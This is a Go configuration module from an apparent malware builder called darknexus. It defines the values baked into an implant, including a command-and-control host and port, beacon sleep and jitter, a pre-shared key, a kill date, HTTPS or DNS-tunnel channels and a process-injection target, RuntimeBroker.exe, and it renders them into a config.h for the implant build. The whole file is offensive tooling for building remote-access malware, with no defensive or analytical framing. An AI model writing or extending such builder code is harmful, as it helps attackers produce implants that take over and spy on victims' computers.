package config

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"text/template"

	"github.com/darknexus/builder/internal/profile"
)

// BuildConfig holds all values that get baked into the implant
type BuildConfig struct {
	// C2 connection
	C2Host    string
	C2Port    int
	CheckinURI string
	ResultURI  string
	UserAgent  string

	// Beacon timing
	SleepSeconds int
	JitterPercent int
	MaxRetries   int

	// Crypto
	PSKHex string // 64 hex chars = 32 bytes

	// Kill date
	KillDate int // YYYYMMDD or 0

	// Injection target
	InjectTarget string

	// Channel selection ("https" or "dns")
	Channel string

	// DNS tunneling
	DNSDomain     string // authoritative domain for DNS tunnel
	DNSNameserver string // optional: direct nameserver IP

	// Build metadata
	BuildID string
	Staged  bool
}

// NewFromProfile creates a BuildConfig from a profile and operator overrides
func NewFromProfile(p *profile.Profile, host string, port int, psk string) *BuildConfig {
	cfg := &BuildConfig{
		C2Host:       host,
		C2Port:       port,
		CheckinURI:   p.HTTP.Checkin.URI,
		ResultURI:    p.HTTP.Result.URI,
		SleepSeconds: p.Beacon.Sleep,
		JitterPercent: p.Beacon.Jitter,
		MaxRetries:   p.Beacon.MaxRetries,
		PSKHex:       psk,
		KillDate:     0,
		InjectTarget: "RuntimeBroker.exe",
		Channel:      "https",
		BuildID:      generateBuildID(),
		Staged:       false,
	}

	// use first user agent from profile
	if len(p.UserAgents) > 0 {
		cfg.UserAgent = p.UserAgents[0]
	} else {
		cfg.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}

	// parse kill date if present
	if p.Beacon.KillDate != "" {
		fmt.Sscanf(p.Beacon.KillDate, "%d", &cfg.KillDate)
	}

	return cfg
}

// GenerateConfigH renders the config.h template with build values
func (c *BuildConfig) GenerateConfigH(templatePath, outputPath string) error {
	tmpl, err := template.ParseFiles(templatePath)
	if err != nil {
		return fmt.Errorf("parse template: %w", err)
	}

	f, err := os.Create(outputPath)
	if err != nil {
		return fmt.Errorf("create config.h: %w", err)
	}
	defer f.Close()

	if err := tmpl.Execute(f, c); err != nil {
		return fmt.Errorf("render template: %w", err)
	}

	return nil
}

// GeneratePSK creates a random 32-byte key and returns hex
func GeneratePSK() (string, error) {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return "", err
	}
	return hex.EncodeToString(key), nil
}

// generateBuildID creates a short random identifier for this build
func generateBuildID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}
